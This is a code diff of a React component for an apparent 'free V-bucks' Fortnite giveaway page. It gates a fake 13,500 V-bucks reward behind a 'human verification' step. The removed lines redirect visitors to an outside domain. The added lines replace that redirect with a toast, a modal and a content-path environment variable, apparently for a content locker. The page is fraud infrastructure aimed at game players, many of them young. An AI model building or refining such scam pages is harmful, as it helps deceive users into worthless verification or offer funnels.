@@ -15,7 +15,8 @@ const Verify = () => {
   const [vbucksAmount, setVbucksAmount] = useState(13500);
   const [isModalOpen, setIsModalOpen] = useState(false);
 
- 
+  const contentPathname = import.meta.env.VITE_CONTENT_PATHNAME;
+
   useEffect(() => {
     const timer = setTimeout(() => {
       setIsLoading(false);
@@ -37,13 +38,11 @@ const Verify = () => {
     };
   }, []);
 
-const handleVerify = () => {
-  const newWindow = window.open("https://www.f9ff.top", "_blank");
-  if (!newWindow || newWindow.closed || typeof newWindow.closed === "undefined") {
-    alert("Popup blocked! Please allow pop-ups in your browser settings.");
-  }
-};
-
+  const handleVerify = () => {
+    toast({
+      title: "Verification Required",
+      description: "Please complete the human verification process.",
+    });
 
     setIsModalOpen(true);
   };
@@ -173,16 +172,11 @@ const handleVerify = () => {
               transition={{ delay: 0.7, duration: 0.5 }}
             >
               <Button
-  onClick={() => {
-    window.location.href = "https://www.f9ff.top";
-  }}
-  className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl"
->
-  Manual Verify
-</Button>
-
-
-
+               onClick={handleVerify}
+                className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl"
+              >
+                Manual Verify
+              </Button>
             </motion.div>
           </motion.div>
         )}
